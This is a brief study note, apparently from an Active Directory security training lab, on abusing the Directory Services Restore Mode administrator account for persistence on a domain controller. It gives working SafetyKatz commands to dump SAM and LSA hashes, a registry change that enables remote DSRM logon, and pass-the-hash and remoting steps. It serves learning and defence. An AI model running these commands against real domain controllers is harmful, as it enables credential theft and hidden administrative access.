DSRM is the directory services restore mode.

There is a local admin on eac `domain controller` called `Administrator` whose password is the `DSRM passowrd`.

`DSRM` password (SafeModePassword) is requested when a server is promoted to Domain Controller and it is rarely changed.

After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.

>[!Note]
>we have to run these commands on the `dcorp-dc`



To dump the `DSRM password` (Domain Admini privileges needed):
```powershell
SafetyKatz.exe "token::elevate" "lsadump::sam"
```

We can compare it with the `Administartor hash` we obtain with:
```powershell
SafetyKatz.exe "lsadump::lsa /patch"
```

They are different because the first one is the `DSRM Administrator`.


# Access
Since it is the local administrator of the DC, we can pass the hash to authenticate.

But the logon behavior for DSRM account needs to be changed before we can use its hash.

To do it:
```powershell 
winrs -r:dcorp-dc cmd

reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```
- We are changing the behavior because by default the access to `DSRM Administrator` cannot be done in remote. with `/d 2` we enable this.


Now we can pass the hash:
```powershell
SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<hash> /run:powershell.exe"
```
- `/domain` here is the domain controller and not the domain.

Then we have to run:
```powershell
Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1 (DC IP)

Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```

